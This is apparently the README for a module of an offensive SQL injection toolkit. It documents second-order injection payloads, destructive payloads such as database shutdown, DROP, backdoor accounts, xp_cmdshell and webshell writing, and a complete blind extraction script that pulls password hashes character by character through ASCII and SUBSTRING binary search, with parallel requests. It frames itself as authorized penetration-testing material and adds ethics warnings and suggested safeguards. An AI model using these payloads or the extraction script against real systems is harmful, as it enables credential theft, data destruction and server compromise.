# SQL Attacker Second-Order Examples Module

## Overview

The `sql_attacker_second_order_examples.py` module provides comprehensive payloads, utilities, and step-by-step guides for advanced SQL injection techniques. This module enhances the SQL Attacker toolkit with real-world attack scenarios for:

1. **Second-Order SQL Injection** - Stored payloads that execute later
2. **Destructive Query Examples** - High-privilege attack payloads
3. **Numeric-Only Field Exploitation** - ASCII/SUBSTRING-based extraction

## Features

### 1. Second-Order SQL Injection

Second-order SQL injection occurs when malicious input is safely stored during one operation but later used unsafely in a different query. This module provides:

- **5 Real-World Scenarios** with detailed explanations:
  - User registration → profile display
  - Profile update → report generation
  - Password change exploitation
  - Comment moderation attacks
  - Search history exploitation

- **DBMS-Specific Payloads** for MySQL, PostgreSQL, MS-SQL, and Oracle
- **Test Vectors** with severity ratings and exploitation details
- **Complete Workflows** from reconnaissance to exploitation

#### Example Usage

```python
from sql_attacker.sql_attacker_second_order_examples import (
    SecondOrderInjection,
    DBMSType
)

# Get second-order payloads for MySQL
payloads = SecondOrderInjection.get_second_order_payloads(DBMSType.MYSQL)

# Access username payloads
print(payloads['username_payloads'])
# ['admin\'--', 'admin\'#', '\' OR \'1\'=\'1', ...]

# Get test vectors for automated testing
test_vectors = SecondOrderInjection.generate_second_order_test_vectors()
for vector in test_vectors:
    print(f"{vector['name']}: {vector['severity']}")
```

### 2. Destructive Query Examples

**WARNING**: These payloads are destructive and should only be used in authorized penetration testing environments.

The module provides destructive SQL payloads that require elevated privileges (DBA, sysadmin) including:

- **Shutdown Commands** - Halt database services
- **DROP DATABASE/TABLE** - Data destruction
- **User Manipulation** - Create backdoor accounts
- **Command Execution** - OS-level compromise (xp_cmdshell, COPY TO PROGRAM)
- **File Operations** - Write webshells, export data
- **Privilege Escalation** - Techniques to gain higher privileges

#### Example Usage

```python
from sql_attacker.sql_attacker_second_order_examples import (
    DestructiveQueries,
    DBMSType
)

# Get destructive payloads for MS-SQL
payloads = DestructiveQueries.get_destructive_payloads(DBMSType.MSSQL)

# Access shutdown payloads
for payload in payloads['shutdown']:
    print(f"Payload: {payload['payload']}")
    print(f"Privileges: {payload['privileges']}")
    print(f"Impact: {payload['impact']}")

# Get privilege escalation techniques
escalation = DestructiveQueries.get_privilege_escalation_payloads(DBMSType.MSSQL)
```

### 3. Numeric-Only Field Exploitation

When only numeric input is accepted and single quotes are filtered, this module provides techniques to extract string data using ASCII values and binary search:

- **ASCII Extraction** - Get character codes via ASCII() and SUBSTRING()
- **Binary Search Algorithm** - Efficient character discovery (~7 requests vs ~95)
- **Length Extraction** - Determine string length before extraction
- **Comparison Payloads** - Greater than, less than, equals operators
- **Complete Examples** - User ID, product ID, order ID scenarios
- **Automation Pseudocode** - Ready-to-implement extraction scripts

#### Example Usage

```python
from sql_attacker.sql_attacker_second_order_examples import (
    NumericExploitation,
    DBMSType
)

# Generate ASCII extraction payload for MySQL
payload = NumericExploitation.generate_ascii_extraction_payload(
    DBMSType.MYSQL,
    table='users',
    column='password',
    position=1,
    where_clause='id=1'
)
print(payload)
# Output: "1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1 LIMIT 1),1,1))={ASCII_VALUE}"

# Generate length extraction payload
length_payload = NumericExploitation.generate_length_extraction_payload(
    DBMSType.MYSQL,
    table='users',
    column='password',
    where_clause='id=1'
)

# Use binary search to find ASCII value efficiently
target_char = 'A'  # ASCII 65
test_function = lambda x: ord(target_char) > x
discovered_ascii = NumericExploitation.binary_search_ascii(test_function)
print(chr(discovered_ascii))  # Output: 'A'

# Get complete exploitation examples
examples = NumericExploitation.get_numeric_exploitation_examples()
for example in examples:
    print(f"Scenario: {example['scenario']}")
    print(f"Step 1: {example['step_1']['payload']}")
```

## Module Structure

### Classes

1. **`SecondOrderInjection`**
   - `SCENARIOS` - Dictionary of real-world attack scenarios
   - `get_second_order_payloads(dbms)` - Generate DBMS-specific payloads
   - `generate_second_order_test_vectors()` - Create test vectors

2. **`DestructiveQueries`**
   - `get_destructive_payloads(dbms)` - Get destructive payloads by DBMS
   - `get_privilege_escalation_payloads(dbms)` - Privilege escalation techniques

3. **`NumericExploitation`**
   - `generate_ascii_extraction_payload(...)` - Create ASCII extraction payloads
   - `generate_length_extraction_payload(...)` - Create length extraction payloads
   - `generate_comparison_payloads(...)` - Create comparison-based payloads
   - `binary_search_ascii(test_function)` - Binary search algorithm
   - `get_numeric_exploitation_examples()` - Complete scenarios
   - `generate_test_payload_list(dbms)` - Ready-to-use test payloads

4. **`ExploitationWorkflow`**
   - `get_second_order_workflow()` - Step-by-step second-order guide
   - `get_numeric_extraction_workflow()` - Step-by-step numeric extraction guide

5. **`DBMSType`** (Enum)
   - MYSQL, POSTGRESQL, MSSQL, ORACLE, SQLITE

### Demo Functions

Run the module directly to see demonstrations:

```bash
python sql_attacker_second_order_examples.py
```

This will demonstrate:
- Second-order injection scenarios and payloads
- Destructive query examples
- Numeric field exploitation techniques
- Complete exploitation workflows

## Integration with SQL Attacker

### Adding to SQLi Engine

```python
# In sqli_engine.py
from sql_attacker.sql_attacker_second_order_examples import (
    SecondOrderInjection,
    NumericExploitation
)

class SQLInjectionEngine:
    def test_second_order(self, storage_url, trigger_url):
        """Test for second-order SQL injection"""
        payloads = SecondOrderInjection.get_second_order_payloads(self.dbms)
        
        for category, payload_list in payloads.items():
            for payload in payload_list:
                # Store payload at storage endpoint
                self.submit_payload(storage_url, payload)
                
                # Trigger execution at trigger endpoint
                response = self.trigger_execution(trigger_url)
                
                # Analyze for successful exploitation
                if self.detect_exploitation(response):
                    return True
        return False
    
    def extract_via_numeric_injection(self, url, param, table, column):
        """Extract data via numeric-only injection"""
        # Get string length
        length = self._extract_length(url, param, table, column)
        
        # Extract each character
        result = ""
        for pos in range(1, length + 1):
            ascii_val = self._extract_char_binary_search(
                url, param, table, column, pos
            )
            result += chr(ascii_val)
        
        return result
```

### Adding to UI

```html
<!-- templates/sql_attacker/dashboard.html -->
<div class="tab-pane" id="second-order">
    <h3>Second-Order SQL Injection Testing</h3>
    <form id="second-order-form">
        <div class="form-group">
            <label>Storage Endpoint (where payload is stored):</label>
            <input type="text" name="storage_endpoint" class="form-control">
        </div>
        <div class="form-group">
            <label>Trigger Endpoint (where payload executes):</label>
            <input type="text" name="trigger_endpoint" class="form-control">
        </div>
        <button type="submit">Test Second-Order Injection</button>
    </form>
</div>

<div class="tab-pane" id="numeric-extraction">
    <h3>Numeric Field Data Extraction</h3>
    <form id="numeric-extraction-form">
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" name="url" class="form-control">
        </div>
        <div class="form-group">
            <label>Numeric Parameter:</label>
            <input type="text" name="param" class="form-control">
        </div>
        <div class="form-group">
            <label>Target Table.Column:</label>
            <input type="text" name="target" class="form-control" placeholder="users.password">
        </div>
        <button type="submit">Extract Data</button>
    </form>
</div>
```

## Testing

The module includes comprehensive unit tests:

### Run with Django

```bash
python manage.py test sql_attacker.test_sql_attacker_second_order
```

### Run Standalone

```bash
cd sql_attacker
python test_sql_attacker_second_order_standalone.py
```

### Test Coverage

- ✅ Second-order payload generation (all DBMS types)
- ✅ Test vector generation and validation
- ✅ Destructive query generation (all DBMS types)
- ✅ Privilege escalation payloads
- ✅ ASCII extraction payload generation (all DBMS types)
- ✅ Length extraction payload generation
- ✅ Comparison payload generation
- ✅ Binary search algorithm (including edge cases)
- ✅ Numeric exploitation examples
- ✅ Workflow generation
- ✅ DBMS compatibility across all features

## Security Considerations

### Ethical Use

This module is designed for **authorized penetration testing only**. Misuse may violate laws and regulations including:

- Computer Fraud and Abuse Act (CFAA) in the United States
- Computer Misuse Act in the United Kingdom
- Similar laws in other jurisdictions

### Safety Features

1. **Warning Messages** - All destructive operations include clear warnings
2. **Documentation** - Extensive docs on prerequisites and impacts
3. **Privilege Requirements** - Clear documentation of required privileges
4. **No Real IPs** - All examples use placeholder domains (attacker.com)
5. **Test Mode** - Module designed for testing, not exploitation

### Recommended Safeguards

When integrating into production tools:

```python
# Add confirmation dialogs for destructive operations
REQUIRE_CONFIRMATION = {
    'destructive_queries': True,
    'privilege_escalation': True,
    'data_exfiltration': True,
}

# Add audit logging
def log_destructive_operation(user, operation, target):
    AuditLog.objects.create(
        user=user,
        operation=operation,
        target=target,
        timestamp=timezone.now()
    )

# Implement privilege levels
if operation_type == 'destructive':
    if not user.has_permission('sql_attacker.destructive_operations'):
        raise PermissionDenied("Destructive operations require admin approval")
```

## Examples and Scenarios

### Complete Second-Order Attack

```python
# Step 1: Register user with malicious username
username = "admin'-- "
password = "password123"

# This is safely stored (parameterized query)
register(username, password)

# Step 2: Trigger exploitation
# When admin views user list, the application executes:
# SELECT * FROM users WHERE username='admin'-- ' AND status='active'
# The -- comment causes the status check to be ignored

# Result: Admin sees all accounts, including inactive/banned ones
```

### Numeric Extraction Attack

```python
# Vulnerable code: /product?id=<USER_INPUT>
# Query: SELECT * FROM products WHERE id=<USER_INPUT>

# Extract admin password hash:
target_url = "http://example.com/product"
param = "id"

# Step 1: Get password length
for length in range(1, 100):
    payload = f"1 AND LENGTH((SELECT password FROM users WHERE id=1))={length}"
    if test_payload(target_url, param, payload):
        print(f"Password length: {length}")
        break

# Step 2: Extract each character via binary search
password_hash = ""
for position in range(1, length + 1):
    # Binary search from ASCII 32 to 126
    min_val, max_val = 32, 126
    while min_val <= max_val:
        mid = (min_val + max_val) // 2
        payload = f"1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),{position},1))>{mid}"
        
        if test_payload(target_url, param, payload):
            min_val = mid + 1
        else:
            max_val = mid - 1
    
    password_hash += chr(min_val)
    print(f"Extracted: {password_hash}")

print(f"Final hash: {password_hash}")
```

## Performance Optimization

### Binary Search vs Linear Search

| Method | Requests per Character | Total for 32-char Hash |
|--------|----------------------|----------------------|
| Linear Search | ~95 (test each ASCII) | ~3,040 requests |
| Binary Search | ~7 (log₂ 95) | ~224 requests |

**Speedup**: 13.6x faster with binary search!

### Parallel Extraction

```python
import concurrent.futures

def extract_character(position):
    return binary_search_char(position)

# Extract multiple characters in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(extract_character, i) for i in range(1, length+1)]
    results = [f.result() for f in futures]

extracted_string = ''.join(results)
```

## Changelog

### Version 1.0.0 (Initial Release)
- ✅ Second-order SQL injection payloads and scenarios
- ✅ Destructive query examples for 4 major DBMS platforms
- ✅ Numeric-only field exploitation utilities
- ✅ Binary search algorithm for efficient extraction
- ✅ Complete workflows and step-by-step guides
- ✅ Comprehensive unit tests (20+ test cases)
- ✅ Integration examples and documentation

## License

This module is part of the Megido security testing platform and follows the same license. Use responsibly and only in authorized testing environments.

## Contributors

Megido Security Team

## Support

For issues, questions, or feature requests, please refer to the main Megido repository.
